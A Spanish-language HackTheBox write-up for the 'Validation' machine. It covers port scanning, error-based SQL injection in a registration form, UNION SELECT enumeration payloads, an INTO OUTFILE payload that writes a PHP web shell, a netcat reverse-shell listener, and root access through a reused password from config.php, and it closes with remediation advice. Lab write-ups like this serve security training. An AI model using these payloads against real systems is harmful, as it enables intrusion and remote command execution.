---
layout: post
permalink: /writeups/validation/
title: "HTB Writeup: Validation"
date: 2026-01-13
category: writeups
tags: [htb, linux, easy, sqli, rce, webshell, php, mysql]
platform: HackTheBox
os: Linux
difficulty: Easy
has_exploits: true
exploits_url: /writeups/validation/exploit/
resumen: "SQL Injection en el campo country permite escribir una webshell PHP vía INTO OUTFILE. Escalada por reutilización de credenciales en config.php."
---

| Propiedad  | Valor         |
| :--------- | :------------ |
| Plataforma | HackTheBox    |
| OS         | Linux         |
| Dificultad | Easy          |
| Autor      | TheCyberGeek  |

### Temas Tratados

- **Reconocimiento:** Enumeración de servicios HTTP y Proxy.
- **SQL Injection:** Detección de _Error-Based SQLi_ y uso de `UNION SELECT`.
- **RCE:** Escritura de archivos en el servidor mediante `INTO OUTFILE`.
- **Scripting:** Automatización de exploit en Python.
- **Privilege Escalation:** Reutilización de credenciales en texto claro (`config.php`).

## 1. Resumen

Durante la auditoría de la máquina **Validation**, se comprometió el sistema explotando una inyección SQL en el formulario de registro. Esta vulnerabilidad permitió escribir una _Web Shell_ PHP en el directorio raíz del servidor web, permitiendo la ejecución remota de comandos como el usuario `www-data`. Posteriormente, se escalaron privilegios a `root` al encontrar credenciales de base de datos reutilizadas en un archivo de configuración.

## 2. Fase de Reconocimiento

### Escaneo de Puertos

Se inició con un escaneo de puertos para identificar la superficie de ataque.

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.95.235 -oG allPorts
```

![Escaneo de puertos con nmap](/writeups/validation/assets/nmap-port-scan.png)

### Análisis de versiones y detección de vulnerabilidades

Con _nmap_ lanzamos un conjunto de scripts para comprobar si existen vulnerabilidades en los servicios que corren en los puertos obtenidos en el escaneo de puertos, y para detectar las versiones de los servicios.

```bash
nmap -sCV -p22,80,4566,8080 10.129.95.235 -oN targeted
```

![Análisis de versiones con nmap](/writeups/validation/assets/nmap-version-scan.png)

#### Resultado del escaneo

- **22/tcp (SSH):** OpenSSH 8.2p1 Ubuntu.
- **80/tcp (HTTP):** Apache httpd 2.4.48.
- **4566/tcp (HTTP):** Nginx (Posible servicio interno o API).
- **8080/tcp (HTTP-Proxy):** Nginx.

### Análisis de los servicios

#### SSH - Puerto 22

La versión de SSH que corre en la máquina víctima no presenta vulnerabilidades conocidas explotables de inmediato.

![Versión de SSH](/writeups/validation/assets/ssh-version-check.png)

#### Apache - Puerto 80

Accedemos al puerto 80 de la máquina víctima y vemos una página web en la que nos permite introducir un _username_ y seleccionar un _country_.

![Formulario de registro web](/writeups/validation/assets/web-registration-form.png)

Al introducir los datos que nos pide nos lleva a esta pestaña, donde se muestra por pantalla los datos introducidos en la pestaña anterior. Esto nos sugiere que la entrada `country` podría estar reflejándose directamente desde la base de datos.

![Resultado del formulario de registro](/writeups/validation/assets/web-registration-result.png)

Para profundizar, realizamos una enumeración de directorios para asegurarnos de no pasar nada por alto.

```bash
gobuster dir -u http://10.129.95.235:80 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

Identificamos `account.php`, que es la página que procesa el registro, y el directorio `/css/`.

![Enumeración de directorios con Gobuster](/writeups/validation/assets/gobuster-directory-enum.png)

## 3. Análisis de Vulnerabilidades (SQL Injection)

### Detección y Análisis

Interceptamos la petición de registro con **Burp Suite** para analizar cómo se tramitan los datos.

Modificando el campo `country` y añadiendo una comilla simple (`'`), observamos que la aplicación devuelve un error crítico, revelando una vulnerabilidad de **SQL Injection Error-Based**.

![Petición interceptada con Burp Suite](/writeups/validation/assets/burp-sqli-request.png)

![Error de SQL Injection en Burp Suite](/writeups/validation/assets/burp-sqli-error-response.png)

**Petición interceptada:**

```
POST / HTTP/1.1
...
username=test&country=Chad'
```

**Respuesta del servidor:**

> `Fatal error: Uncaught Error: Call to a member function fetch_assoc() on bool in /var/www/html/account.php:33`

![Error de SQL Injection en navegador](/writeups/validation/assets/sqli-error-browser.png)

### Enumeración de Base de Datos

Aprovechando la inyección, inyectamos consultas `UNION SELECT` para extraer información.

1. **Validar número de columnas:**
   - `' ORDER BY 2-- -` (Error)

![ORDER BY 2 - Error](/writeups/validation/assets/sqli-order-by-2-error.png)

![ORDER BY 2 - Respuesta de error](/writeups/validation/assets/sqli-order-by-2-response.png)

   - `' ORDER BY 1-- -` (Correcto)

![ORDER BY 1 - Exitoso](/writeups/validation/assets/sqli-order-by-1-success.png)

   - **Conclusión:** La consulta tiene 1 sola columna.

2. **Extraer base de datos activa:** Payload: `' UNION SELECT database()-- -`

![Enumeración de base de datos](/writeups/validation/assets/sqli-database-enum.png)

   - **Base de datos:** `registration`

3. **Enumerar el usuario que corre la Base de Datos:** Payload: `' UNION SELECT user()-- -`

![Enumeración de usuario de base de datos](/writeups/validation/assets/sqli-user-enum.png)

   - **Usuario**: `uhc@localhost`

4. **Enumerar tablas de la base de datos:** Payload: `' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='registration'-- -`

![Enumeración de tablas](/writeups/validation/assets/sqli-tables-enum.png)

   - **Tablas:** `registration`

5. **Enumerar columnas de la tabla registration:** Payload: `' UNION SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema='registration' and table_name='registration'-- -`

![Enumeración de columnas](/writeups/validation/assets/sqli-columns-enum.png)

   - **Columnas:** `username, userhash, country, regtime`

6. **Enumerar datos:** Payload: `' UNION SELECT group_concat(username, 0x3a, userhash, 0x3a, country, 0x3a, regtime) FROM registration-- -`

![Enumeración de datos de la tabla](/writeups/validation/assets/sqli-data-enum.png)

   - **Resultados:** Nada relevante. Se concluye que no es posible obtener datos críticos directamente de la base de datos.

## 4. Explotación: De SQLi a RCE

Aunque es posible volcar la base de datos, el vector más crítico es la ejecución de comandos. Descubrimos que el usuario `uhc@localhost` tiene permisos de escritura en el directorio web (`/var/www/html`), lo que nos permite usar la cláusula `INTO OUTFILE` para crear archivos.

**Estrategia:** Subir una _Web Shell_ PHP que ejecute comandos del sistema.

![Payload para Web Shell](/writeups/validation/assets/sqli-webshell-payload.png)

**Payload SQL:**

```sql
Brazil' UNION SELECT "<?php system($_REQUEST['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'-- -
```

![Creación de Web Shell](/writeups/validation/assets/sqli-webshell-creation.png)

Mediante el parámetro `cmd` podemos controlar la ejecución de comandos en la máquina víctima.

![Ejecución de comandos mediante Web Shell](/writeups/validation/assets/webshell-command-execution.png)

Interactuar de esta forma con la máquina no es cómodo ni estable, por lo que se decidió crear un pequeño script en **Python** para entregarnos una **Reverse Shell** y así tener una consola cómoda.

### Ejecución

1. Ponemos un listener: `nc -lvnp 7777`
2. Ejecutamos el exploit (ver sección **// Exploits**).
3. Obtenemos acceso como `www-data`.

![Acceso mediante Reverse Shell](/writeups/validation/assets/reverse-shell-access.png)

## 5. Escalada de Privilegios

Una vez dentro, enumeramos el directorio actual (`/var/www/html`). Encontramos un archivo de configuración llamado `config.php` y listamos su contenido:

```bash
ls
cat config.php
```

Leemos el archivo y encontramos credenciales en texto claro:

```php
<?php
$servername = "127.0.0.1";
$username = "uhc";
$password = "uhc-9qual-global-pw";
$dbname = "registration";
?>
```

### Reutilización de Credenciales

Probamos si esta contraseña es válida para el usuario `root` del sistema.

```bash
su root
# Password: uhc-9qual-global-pw
```

El intento es exitoso y obtenemos acceso total a la máquina.

📌 **Root flag:** `/root/root.txt`

![Root Flag obtenida](/writeups/validation/assets/root-flag.png)

## 6. Soluciones

1. **Sanitización:** Implementar _Prepared Statements_ en PHP para evitar SQL Injection.
2. **Permisos MySQL:** Revocar el permiso `FILE` al usuario de base de datos para prevenir `INTO OUTFILE`.
3. **Gestión de Contraseñas:** No almacenar contraseñas en archivos planos dentro de un directorio web público.
